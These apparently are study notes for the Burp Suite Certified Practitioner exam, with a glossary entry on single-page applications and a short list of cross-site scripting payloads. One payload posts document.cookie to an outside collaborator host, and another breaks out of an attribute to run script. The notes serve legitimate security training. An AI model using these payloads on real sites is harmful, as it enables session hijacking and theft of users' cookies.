## Glossary
- **SPA**: Single-page application. A web app implementation that loads only a single web document, and then updates the body content of that single document via JavaScript APIs, such as Fetch, when different content is shown. Allows users to use websites without having to load whole new pages fromt he server, which can result in performance gains and a more dynamic experience.

## Random Notes
- Reflective XSS payload `(" onfocus="alert(document.cookie)"` [OnFocus Event](https://www.w3schools.com/jsref/event_onfocus.asp)

![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/12554a2b-795e-4135-88eb-19db2d510fae)

- Various XSS Payloads:
  - `<script>fetch("https://5mss4wrjzbfwlhwjbtrnuba4evkm8ew3.rsmcollaborator.com",{method:'POST', body:document.cookie});</script>`
  - `<img src="http://url.to.file.which/not.exist" onerror=window.open("https://www.google.com","xss",'height=500,width=500');>`

- [webhook.site](webhook.site) can be utilized for SSRF testing outside of Burp Suite collaborator. 
